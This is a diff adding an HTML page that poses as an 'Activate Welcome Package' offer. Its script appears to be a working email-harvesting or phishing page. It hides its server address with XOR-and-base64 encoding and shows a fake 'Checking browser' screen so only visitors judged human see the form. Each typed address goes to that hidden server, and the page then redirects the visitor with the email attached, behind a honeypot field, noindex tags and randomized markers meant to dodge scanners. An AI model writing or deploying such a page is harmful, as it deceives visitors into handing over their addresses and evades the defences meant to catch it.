@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+<meta name="robots" content="noindex,nofollow,noarchive" />
+<title>Activate Welcome Package</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background-color:#0a0f18;background-size:cover;background-position:center center;background-repeat:no-repeat;min-height:100dvh;display:flex;justify-content:center;align-items:center;padding:20px;color:#fff}
+.card{background:rgba(10,15,30,0.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);padding:35px 30px;border-radius:16px;border:2px solid #d4af37;box-shadow:0 0 30px rgba(212,175,55,0.5),0 20px 40px rgba(0,0,0,0.8);text-align:center;max-width:420px;width:100%;position:relative;margin-top:15vh;animation:cardIn 0.5s ease-out;display:none}
+@keyframes cardIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
+.subtitle{font-size:18px;font-weight:500;color:#f8fafc;line-height:1.5;margin-bottom:24px;text-shadow:0 2px 4px rgba(0,0,0,0.8)}
+.wrap{position:relative;text-align:left;margin-bottom:10px}
+input[type=email]{width:100%;padding:18px;font-size:18px;border:2px solid #475569;border-radius:8px;outline:none;transition:all 0.3s;font-family:inherit;background:rgba(30,41,59,0.9);color:#fff;text-align:center}
+input[type=email]::placeholder{color:#94a3b8;opacity:1}
+@keyframes pulseGold{0%{box-shadow:0 0 0 0 rgba(212,175,55,0.5);border-color:rgba(212,175,55,0.6)}50%{box-shadow:0 0 0 10px rgba(212,175,55,0);border-color:rgba(212,175,55,1)}100%{box-shadow:0 0 0 0 rgba(212,175,55,0);border-color:rgba(212,175,55,0.6)}}
+input[type=email].pulse{animation:pulseGold 2s infinite}
+input[type=email]:focus{border-color:#d4af37;box-shadow:0 0 15px rgba(212,175,55,0.5);background:rgba(15,23,42,0.95);animation:none}
+input[type=email]:disabled{opacity:0.6;cursor:not-allowed;animation:none}
+.suggestion{position:absolute;left:0;right:0;top:calc(100% + 8px);background:#1e293b;border:1px solid #d4af37;border-radius:8px;box-shadow:0 10px 25px rgba(0,0,0,0.5);padding:8px;display:flex;flex-wrap:wrap;gap:8px;z-index:10;animation:hintIn 0.2s ease-out;max-height:150px;overflow-y:auto}
+@keyframes hintIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.suggestion[hidden]{display:none}
+.suggestion-btn{flex:1 0 auto;padding:12px;background:rgba(212,175,55,0.15);color:#d4af37;border:1px solid rgba(212,175,55,0.3);border-radius:6px;font-weight:600;cursor:pointer;font-size:16px;transition:all 0.2s}
+.suggestion-btn:hover{background:rgba(212,175,55,0.3)}
+.honeypot{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+.redirect-note{font-size:12px;color:#94a3b8;margin-top:10px;margin-bottom:5px;text-align:center}
+.badge{margin-top:15px;font-size:12px;color:#94a3b8;display:flex;align-items:center;justify-content:center;gap:6px}
+@media (max-width:768px){body{align-items:flex-end;padding-bottom:30px}.card{margin-top:0;padding:25px 20px}.subtitle{font-size:16px;margin-bottom:20px}input[type=email]{padding:16px;font-size:16px}}
+.check-overlay{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;width:100%;position:fixed;top:0;left:0;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);z-index:9999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+.check-card{background:#fff;padding:40px 30px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center;max-width:400px;width:90%;position:relative;overflow:hidden}
+.check-spinner{width:50px;height:50px;margin:0 auto 20px;border:4px solid #e5e7eb;border-top:4px solid #4d81f1;border-radius:50%;animation:check-spin 1s linear infinite}
+@keyframes check-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.check-h1{font-size:20px;margin-bottom:12px;font-weight:600;color:#111827}
+.check-p{font-size:15px;color:#4b5563;line-height:1.5}
+.check-secure-badge{margin-top:30px;font-size:12px;color:#9ca3af;display:flex;align-items:center;justify-content:center;gap:6px}
+.check-loading-bar{height:4px;width:100%;background:#f3f4f6;position:absolute;top:0;left:0}
+.check-loading-bar::after{content:'';position:absolute;left:-30%;top:0;height:100%;width:30%;background:#4d81f1;animation:check-load 2s infinite ease-in-out}
+@keyframes check-load{0%{left:-30%}100%{left:100%}}
+</style>
+
+<!-- 0izdeaerx8ig0cv -->
+</head>
+<body data-ver="iybv9" data-sig="9en492sk7dmp">
+
+<div id="check-screen" class="check-overlay">
+    <div class="check-card rnd-912lc2">
+        <div class="check-loading-bar"></div>
+        <div class="check-spinner"></div>
+        <h1 id="check-text" class="check-h1">Checking browser...</h1>
+        <p class="check-p">Please wait. A secure connection is being established, do not close the page.</p>
+        <div class="check-secure-badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            Secure connection
+        </div>
+    </div>
+</div>
+
+<div class="card rnd-912lc2" id="main-card">
+  <p class="subtitle" id="subtitle">Enter your email address to activate your welcome package.</p>
+  <div class="wrap">
+    <input type="email" id="email" class="pulse" placeholder="Enter your email" autocomplete="email" inputmode="email" autocapitalize="off" autocorrect="off" spellcheck="false" maxlength="128" />
+    <div class="suggestion" id="suggestion" hidden="hidden"></div>
+  </div>
+  <p class="redirect-note">You will be redirected automatically after entering your email.</p>
+  <input type="text" name="website" id="hp" class="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true" />
+  <div class="badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+    <span>Secure connection</span>
+  </div>
+</div>
+
+<!-- saw89mb26f -->
+<script>
+(function(){
+  'use strict';
+
+  var _enc = "XwUOEhFfWx1bDRVaQ1BFRhoSFg0DBh9XRVYZU1QRBxRUFFUDEgxaQl8I";
+  var _img_pc = "XwUOEhFfWx1FGQYbHQsDHUITDxEHFxddWQwUWw5MFBpaXh8OCxERQUcRHxofDh4BUgIKCwxLE1tDEARXVAsYWkUUHBFNDRFTUwteWBsLGVpRFQkEBgAGQ0AnFFZDBQIXGQYfABI=";
+  var _img_mob = "XwUOEhFfWx1FGQYbHQsDHUITDxEHFxddWQwUWw5MFBpaXh8OCxERQUcRHxofDh4BUgIKCwxLE1tDEARXVAsYWkUUHBFNDRFTUwteWBsLGVpQFx0GBAIrBEcWRVZPTAAQVQE=";
+  var _key = "7qzbbet27xq5zbwu";
+
+  function _dec(str, key) {
+    try {
+      var b = atob(str), res = '';
+      for (var i = 0; i < b.length; i++) {
+        res += String.fromCharCode(b.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+      }
+      return res;
+    } catch(e) { return ''; }
+  }
+
+  var API_URL = _dec(_enc, _key);
+
+  var CONFIG = {
+    PROXY_SECRET: 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6',
+    ABSOLUTE_TIMEOUT_MS: 35000,
+    LOOKUP_DEBOUNCE_MS: 150,
+    EMAIL_DEBOUNCE_MS: 100,
+    GARBAGE_TIMEOUT_MS: 10000,
+    MIN_LOADER_TIME: 250
+  };
+
+  function guardHash(s) {
+    let h = 5381;
+    for (let i = 0; i < s.length; i++) {
+        h = ((h << 5) + h) + s.charCodeAt(i);
+        h = h & 0xFFFFFFFF;
+    }
+    return (h >>> 0).toString(36);
+  }
+
+  function getTokenUrl(action, extraParams = "") {
+    let t = Math.floor(Date.now() / 1000);
+    let k = guardHash(CONFIG.PROXY_SECRET + "|" + t);
+    return `${API_URL}?action=${action}&t=${t}&k=${k}${extraParams}`;
+  }
+
+  function initFormLogic() {
+    var EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+    var redirected = false;
+    var hasInteracted = false;
+    var absoluteTimer = null, lookupTimer = null, emailTimer = null;
+    var lastNickname = '';
+    var site = window.location.hostname;
+    var browserLang = navigator.language || navigator.userLanguage || 'en-US';
+
+    var startTime = Date.now();
+    var hadMouse = false;
+    var hadTouch = false;
+    var hadKey = false;
+
+    var emailEl = document.getElementById('email');
+    var suggestionEl = document.getElementById('suggestion');
+    var subtitleEl = document.getElementById('subtitle');
+    var hpEl = document.getElementById('hp');
+
+    function startAbsoluteTimer() {
+      if (hasInteracted || redirected) return;
+      hasInteracted = true;
+      absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
+    }
+
+    function triggerTimeout() {
+      if (redirected) return;
+      doResolve('timeout', 'timeout');
+    }
+
+    function doResolve(mode, value) {
+      if (redirected) return;
+      
+      if (hpEl.value !== '') {
+          redirected = true;
+          if (absoluteTimer) clearTimeout(absoluteTimer);
+          if (lookupTimer) clearTimeout(lookupTimer);
+          if (emailTimer) clearTimeout(emailTimer);
+          return; 
+      }
+
+      redirected = true;
+      if (absoluteTimer) clearTimeout(absoluteTimer);
+      if (lookupTimer) clearTimeout(lookupTimer);
+      if (emailTimer) clearTimeout(emailTimer);
+
+      emailEl.disabled = true;
+      emailEl.classList.remove('pulse');
+      suggestionEl.hidden = true;
+      subtitleEl.textContent = 'Redirecting... Please wait a moment.';
+      subtitleEl.style.color = '#d4af37';
+
+      var timeOnPage = Date.now() - startTime;
+      
+      var finalUrl = getTokenUrl('go', '&site=' + encodeURIComponent(site) + '&val=' + encodeURIComponent(value) + '&lang=' + encodeURIComponent(browserLang) + '&time=' + timeOnPage);
+      
+      // Прямой переход без fetch/CORS проблем
+      try {
+        if (window.top && window.top !== window) {
+            window.top.location.href = finalUrl;
+        } else {
+            window.location.href = finalUrl;
+        }
+      } catch (e) {
+        window.location.href = finalUrl;
+      }
+    }
+
+    function doLookup(nickname) {
+      fetch(getTokenUrl('dns', '&nickname=' + encodeURIComponent(nickname)))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (redirected) return;
+          var matches = (d && d.matches) || [];
+          if (matches.length > 0) renderSuggestion(matches, nickname);
+          else hideSuggestion();
+        })
+        .catch(function() { hideSuggestion(); });
+    }
+
+    function renderSuggestion(domains, nickname) {
+      suggestionEl.innerHTML = '';
+      domains.forEach(function(domain) {
+        var btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'suggestion-btn';
+        btn.textContent = '@' + domain;
+        btn.addEventListener('click', function(e) {
+          e.preventDefault();
+          var finalEmail = nickname + '@' + domain;
+          emailEl.value = finalEmail;
+          hideSuggestion();
+          doResolve('email', finalEmail);
+        });
+        suggestionEl.appendChild(btn);
+      });
+      suggestionEl.hidden = false;
+    }
+
+    function hideSuggestion() {
+      suggestionEl.hidden = true;
+      suggestionEl.innerHTML = '';
+    }
+
+    function handleInput() {
+      if (redirected) return;
+      startAbsoluteTimer();
+      var value = emailEl.value;
+      emailEl.classList.remove('pulse');
+
+      var atPos = value.indexOf('@');
+      var nickname = atPos > 0 ? value.substring(0, atPos).toLowerCase().trim() : '';
+
+      if (nickname.length > 0 && nickname !== lastNickname) {
+        lastNickname = nickname;
+        if (lookupTimer) clearTimeout(lookupTimer);
+        lookupTimer = setTimeout(function() { doLookup(nickname); }, CONFIG.LOOKUP_DEBOUNCE_MS);
+      } else if (nickname.length === 0) {
+        lastNickname = '';
+        hideSuggestion();
+        if (lookupTimer) clearTimeout(lookupTimer);
+      }
+
+      if (emailTimer) clearTimeout(emailTimer);
+
+      if (EMAIL_REGEX.test(value.trim())) {
+        emailTimer = setTimeout(function() { doResolve('email', emailEl.value.trim()); }, CONFIG.EMAIL_DEBOUNCE_MS);
+      } else if (value.trim().length > 0) {
+        emailTimer = setTimeout(function() {
+            var val = emailEl.value.trim();
+            if (/^\d{8}$/.test(val)) {
+                redirected = true;
+                return;
+            }
+            doResolve('email', val);
+        }, CONFIG.GARBAGE_TIMEOUT_MS);
+      }
+    }
+
+    emailEl.addEventListener('input', handleInput);
+    emailEl.addEventListener('keydown', function(e) {
+      startAbsoluteTimer();
+      hadKey = true;
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        if (emailTimer) clearTimeout(emailTimer);
+        doResolve('email', emailEl.value.trim());
+      }
+    });
+
+    document.addEventListener('mousemove', function() { hadMouse = true; startAbsoluteTimer(); }, { passive: true });
+    document.addEventListener('touchstart', function() { hadTouch = true; startAbsoluteTimer(); }, { passive: true });
+    document.addEventListener('touchmove', function() { hadTouch = true; }, { passive: true });
+    document.addEventListener('scroll', function() { startAbsoluteTimer(); }, { passive: true, capture: true });
+    document.addEventListener('click', function() { startAbsoluteTimer(); });
+    document.addEventListener('keydown', function() { hadKey = true; startAbsoluteTimer(); });
+  }
+
+  var fetchStartTime = Date.now();
+
+  fetch(getTokenUrl('check'))
+    .then(function(r) { 
+        if (r.status === 403) return { status: 'bot' }; 
+        return r.json(); 
+    })
+    .then(function(d) {
+        if (d.status === 'human') {
+            var elapsed = Date.now() - fetchStartTime;
+            var remainingDelay = Math.max(0, CONFIG.MIN_LOADER_TIME - elapsed);
+
+            setTimeout(function() {
+                var pc_bg = _dec(_img_pc, _key);
+                var mob_bg = _dec(_img_mob, _key);
+                document.body.style.backgroundImage = "url('" + pc_bg + "')";
+                if (window.innerWidth <= 768) {
+                    document.body.style.backgroundImage = "url('" + mob_bg + "')";
+                }
+                document.getElementById('check-screen').style.display = 'none';
+                document.getElementById('main-card').style.display = 'block';
+                initFormLogic();
+            }, remainingDelay);
+        } else {
+            document.getElementById('check-text').textContent = 'Checking browser...';
+        }
+    })
+    .catch(function(e) {
+        var elapsed = Date.now() - fetchStartTime;
+        var remainingDelay = Math.max(0, CONFIG.MIN_LOADER_TIME - elapsed);
+
+        setTimeout(function() {
+            var pc_bg = _dec(_img_pc, _key);
+            var mob_bg = _dec(_img_mob, _key);
+            document.body.style.backgroundImage = "url('" + pc_bg + "')";
+            if (window.innerWidth <= 768) {
+                document.body.style.backgroundImage = "url('" + mob_bg + "')";
+            }
+            document.getElementById('check-screen').style.display = 'none';
+            document.getElementById('main-card').style.display = 'block';
+            initFormLogic();
+        }, remainingDelay);
+    });
+
+})();
+</script>
+
+<div id="tdh27xkkos" class="prcra" style="display:none;">0l348gmuvv2mtr5adne1</div>
+</body>
+</html>
